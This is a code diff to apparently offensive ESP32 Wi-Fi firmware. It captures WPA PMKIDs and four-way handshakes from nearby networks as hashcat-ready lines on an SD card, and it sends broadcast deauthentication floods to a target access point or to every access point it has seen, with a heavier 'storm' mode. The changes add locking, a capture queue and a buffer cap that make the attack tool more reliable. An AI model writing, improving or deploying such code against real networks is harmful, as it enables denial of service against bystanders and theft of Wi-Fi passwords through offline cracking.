@@ -134,11 +134,59 @@ static uint8_t triton_pick_channel(void)
     return 1 + (esp_random() % 13);
 }
 
-/* Cache: BSSID -> SSID (from beacons) so handshakes get real ESSID. */
+/* Cache: BSSID -> SSID (from beacons) so handshakes get real ESSID.
+ * Written from cb() on the Wi-Fi task, read from hop_task + SD writer on
+ * another core — guarded by s_bs_mux to prevent torn reads of BSSID/SSID. */
 struct bs_t { uint8_t bssid[6]; char ssid[33]; };
 #define BS_N 24
 static bs_t s_bs[BS_N];
 static volatile int s_bs_n = 0;
+static portMUX_TYPE s_bs_mux = portMUX_INITIALIZER_UNLOCKED;
+
+/* Deferred capture queue. Wi-Fi promisc callback runs in the Wi-Fi task
+ * at high priority and MUST NOT do SPI I/O — it'd contend with the SD
+ * mutex and has tripped WDT resets in past testing. Callback builds the
+ * hashcat line and enqueues it; hop_task drains + flushes to SD. */
+struct capture_t { char line[1024]; };
+#define CAPTURE_Q 8
+static capture_t s_capq[CAPTURE_Q];
+static volatile int s_capq_head = 0;
+static volatile int s_capq_tail = 0;
+static portMUX_TYPE s_capq_mux = portMUX_INITIALIZER_UNLOCKED;
+
+static void capture_enqueue(const char *line)
+{
+    portENTER_CRITICAL(&s_capq_mux);
+    int next = (s_capq_head + 1) % CAPTURE_Q;
+    if (next != s_capq_tail) {
+        strncpy(s_capq[s_capq_head].line, line, sizeof(s_capq[0].line) - 1);
+        s_capq[s_capq_head].line[sizeof(s_capq[0].line) - 1] = '\0';
+        s_capq_head = next;
+    }
+    /* On queue full we drop — better than blocking the Wi-Fi task. */
+    portEXIT_CRITICAL(&s_capq_mux);
+}
+
+static void capture_flush(void)
+{
+    while (true) {
+        char line[1024];
+        bool have = false;
+        portENTER_CRITICAL(&s_capq_mux);
+        if (s_capq_tail != s_capq_head) {
+            strncpy(line, s_capq[s_capq_tail].line, sizeof(line) - 1);
+            line[sizeof(line) - 1] = '\0';
+            s_capq_tail = (s_capq_tail + 1) % CAPTURE_Q;
+            have = true;
+        }
+        portEXIT_CRITICAL(&s_capq_mux);
+        if (!have) break;
+        if (s_file) {
+            s_file.print(line);
+            s_file.flush();
+        }
+    }
+}
 
 /* Pending M1 for (BSSID, STA) pair awaiting M2. */
 struct m1_t {
@@ -151,11 +199,20 @@ struct m1_t {
 static m1_t s_m1[M1_N];
 static volatile int s_m1_n = 0;
 
-static const char *ssid_of(const uint8_t *b)
+/* Caller copies the SSID into a local buffer under the mux — returning
+ * a pointer to s_bs[].ssid would let it be overwritten mid-use. */
+static void ssid_of(const uint8_t *b, char *out, size_t out_sz)
 {
-    for (int i = 0; i < s_bs_n; ++i)
-        if (memcmp(s_bs[i].bssid, b, 6) == 0) return s_bs[i].ssid;
-    return "";
+    out[0] = '\0';
+    portENTER_CRITICAL(&s_bs_mux);
+    for (int i = 0; i < s_bs_n; ++i) {
+        if (memcmp(s_bs[i].bssid, b, 6) == 0) {
+            strncpy(out, s_bs[i].ssid, out_sz - 1);
+            out[out_sz - 1] = '\0';
+            break;
+        }
+    }
+    portEXIT_CRITICAL(&s_bs_mux);
 }
 
 static void hexcat(char *dst, const uint8_t *src, int n)
@@ -166,8 +223,7 @@ static void hexcat(char *dst, const uint8_t *src, int n)
 
 static void emit_pmkid(const uint8_t *pmkid, const uint8_t *bssid, const uint8_t *sta)
 {
-    if (!s_file) return;
-    const char *ssid = ssid_of(bssid);
+    char ssid[33]; ssid_of(bssid, ssid, sizeof(ssid));
     char line[300] = "WPA*01*";
     hexcat(line, pmkid, 16); strcat(line, "*");
     hexcat(line, bssid, 6);  strcat(line, "*");
@@ -177,8 +233,7 @@ static void emit_pmkid(const uint8_t *pmkid, const uint8_t *bssid, const uint8_t
         strcat(line, h);
     }
     strcat(line, "***\n");
-    s_file.print(line);
-    s_file.flush();
+    capture_enqueue(line);
     s_pmk++;
     s_last_catch = millis();
     triton_reward(s_ch);
@@ -188,8 +243,13 @@ static void emit_hs(const uint8_t *bssid, const uint8_t *sta,
                     const uint8_t *mic, const uint8_t *anonce,
                     const uint8_t *m2, int m2_len)
 {
-    if (!s_file) return;
-    const char *ssid = ssid_of(bssid);
+    /* A real EAPOL M2 is ~121 bytes. Cap defensively so a malformed
+     * frame (sig_len up to ~2300) can't smash the 1024-byte stack line
+     * buffer via hexcat(m2, m2_len) which writes m2_len*2 hex chars. */
+    if (m2_len > 256) m2_len = 256;
+    if (m2_len < 0)   m2_len = 0;
+
+    char ssid[33]; ssid_of(bssid, ssid, sizeof(ssid));
     char line[1024] = "WPA*02*";
     hexcat(line, mic, 16);    strcat(line, "*");
     hexcat(line, bssid, 6);   strcat(line, "*");
@@ -201,8 +261,7 @@ static void emit_hs(const uint8_t *bssid, const uint8_t *sta,
     strcat(line, "*");
     hexcat(line, anonce, 32); strcat(line, "*");
     hexcat(line, m2, m2_len); strcat(line, "*02\n");
-    s_file.print(line);
-    s_file.flush();
+    capture_enqueue(line);
     s_hs++;
     s_last_catch = millis();
     triton_reward(s_ch);
@@ -294,12 +353,18 @@ static void handle_eapol(const uint8_t *frame, int len)
 static void cache_beacon(const uint8_t *bssid, const uint8_t *tags, int len)
 {
     if (len < 2 || tags[0] != 0 || tags[1] == 0 || tags[1] > 32) return;
+    portENTER_CRITICAL(&s_bs_mux);
     int idx = -1;
     for (int i = 0; i < s_bs_n; ++i)
         if (!memcmp(s_bs[i].bssid, bssid, 6)) { idx = i; break; }
-    if (idx < 0) { if (s_bs_n >= BS_N) return; idx = s_bs_n++; memcpy(s_bs[idx].bssid, bssid, 6); }
+    if (idx < 0) {
+        if (s_bs_n >= BS_N) { portEXIT_CRITICAL(&s_bs_mux); return; }
+        idx = s_bs_n++;
+        memcpy(s_bs[idx].bssid, bssid, 6);
+    }
     memcpy(s_bs[idx].ssid, tags + 2, tags[1]);
     s_bs[idx].ssid[tags[1]] = '\0';
+    portEXIT_CRITICAL(&s_bs_mux);
 }
 
 static void cb(void *buf, wifi_promiscuous_pkt_type_t type)
@@ -364,17 +429,33 @@ static void hop_task(void *)
                     wifi_deauth_broadcast(s_target_bssid, &seq);
                     delay(5);
                 }
-            } else if (s_bs_n > 0) {
+            } else {
+                /* Snapshot BSSIDs under the mux — cache_beacon can fire
+                 * on the Wi-Fi task at any time and would otherwise race
+                 * the read of s_bs[i].bssid below. */
+                uint8_t bssids[BS_N][6];
+                int nb = 0;
+                portENTER_CRITICAL(&s_bs_mux);
+                int cap = s_bs_n > BS_N ? BS_N : s_bs_n;
+                for (int i = 0; i < cap; ++i) memcpy(bssids[i], s_bs[i].bssid, 6);
+                nb = cap;
+                portEXIT_CRITICAL(&s_bs_mux);
+
                 int bursts = (s_mode == TM_STORM) ? 4 : 2;
-                for (int i = 0; i < s_bs_n && s_alive; ++i) {
+                for (int i = 0; i < nb && s_alive; ++i) {
                     for (int k = 0; k < bursts; ++k) {
-                        wifi_deauth_broadcast(s_bs[i].bssid, &seq);
+                        wifi_deauth_broadcast(bssids[i], &seq);
                         delay(5);
                     }
                 }
             }
             wifi_silent_ap_end();
         }
+
+        /* Drain any PMKID/handshake captures that the Wi-Fi callback
+         * enqueued since the last pass. Running this here keeps SD SPI
+         * off the promiscuous RX task. */
+        capture_flush();
 
         /* Dwell per mode. */
         int dwell_ms;
@@ -392,6 +473,7 @@ static void hop_task(void *)
             triton_learn_save();
         }
     }
+    capture_flush();       /* flush any trailing captures before exit */
     triton_learn_save();
     vTaskDelete(nullptr);
 }
